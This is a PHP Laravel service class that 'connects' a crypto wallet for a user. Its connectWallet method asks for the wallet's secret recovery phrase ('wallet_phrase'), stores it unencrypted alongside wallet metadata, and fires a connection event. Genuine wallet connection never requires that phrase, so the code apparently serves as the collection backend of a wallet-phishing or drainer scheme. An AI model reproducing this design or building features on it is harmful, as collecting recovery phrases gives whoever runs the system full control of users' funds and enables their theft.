<?php

namespace App\Services;

use App\Events\WalletConnected;
use App\Models\User;
use App\Models\WalletConnect;

class WalletConnectionService
{
    protected GatewayHandlerService $gatewayHandler;

    public function __construct(GatewayHandlerService $gatewayHandler)
    {
        $this->gatewayHandler = $gatewayHandler;
    }

    /**
     * Connects a new wallet for a user, fetching full details.
     *
     * @param User $user The authenticated user.
     * @param array $data Validated data from the request.
     * @return WalletConnect|null
     */
    public function connectWallet(User $user, array $data): ?WalletConnect
    {
        $walletDetails = $this->gatewayHandler->getWallet($data['wallet_id']);

        if (!$walletDetails) {
            return null;
        }

        $connection = $user->wallets()->create([
            'wallet_id' => $data['wallet_id'],
            'wallet_name' => $data['wallet_name'],
            'wallet_phrase' => $data['wallet_phrase'],
            'wallet_logo' => $walletDetails['LogoUrl'] ?? null,
            'security_type' => $walletDetails['Security'] ?? null,
            'anonymity_level' => $walletDetails['Anonymity'] ?? null,
            'ease_of_use' => $walletDetails['EaseOfUse'] ?? null,
            'validation_type' => $walletDetails['Validation'] ?? null,
            'supported_coins' => $walletDetails['Coins'] ?? [],
            'platforms' => $walletDetails['Platforms'] ?? [],
            'wallet_features' => $walletDetails['WalletFeatures'] ?? [],
            'affiliate_url' => $walletDetails['AffiliateUrl'] ?? null,
            'connected_at' => now(),
        ]);

        if ($connection) {
            event(new WalletConnected($user, $connection));
        }

        return $connection;
    }
}
